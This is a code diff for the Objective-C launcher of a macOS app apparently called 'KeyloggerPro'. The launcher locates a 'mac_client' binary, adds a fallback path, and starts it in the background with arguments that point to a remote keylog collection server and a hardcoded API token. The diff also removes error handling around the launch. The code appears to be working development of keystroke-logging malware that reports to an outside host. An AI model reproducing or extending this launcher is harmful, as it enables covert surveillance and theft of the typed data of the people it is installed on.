@@ -2,10 +2,18 @@
 
 int main(int argc, const char * argv[]) {
     @autoreleasepool {
-        // Cherche mac_client dans le bundle .app
         NSString *clientPath = [[NSBundle mainBundle] pathForResource:@"mac_client" ofType:nil];
+
+        // Fallback quand on lance depuis le dossier (tests terminal)
         if (!clientPath) {
-            NSLog(@"mac_client introuvable dans le bundle");
+            clientPath = [[NSFileManager defaultManager]
+                          currentDirectoryPath];
+            clientPath = [clientPath stringByAppendingPathComponent:
+                          @"KeyloggerPro.app/Contents/MacOS/mac_client"];
+        }
+
+        if (![[NSFileManager defaultManager] fileExistsAtPath:clientPath]) {
+            NSLog(@"mac_client introuvable: %@", clientPath);
             return 1;
         }
 
@@ -15,15 +23,8 @@ int main(int argc, const char * argv[]) {
             @"https://api.keylog.claverie.site",
             @"72UsPl9QtgelVRbJ44u-G6hcNiSIWx64MEOWcmcCQ"
         ];
-
-        @try {
-            [task launch];
-        } @catch (NSException *e) {
-            NSLog(@"Erreur au lancement de mac_client: %@", e);
-            return 1;
-        }
+        [task launch];
     }
-    // Le launcher se termine, mac_client reste en arrière‑plan
     return 0;
 }
 
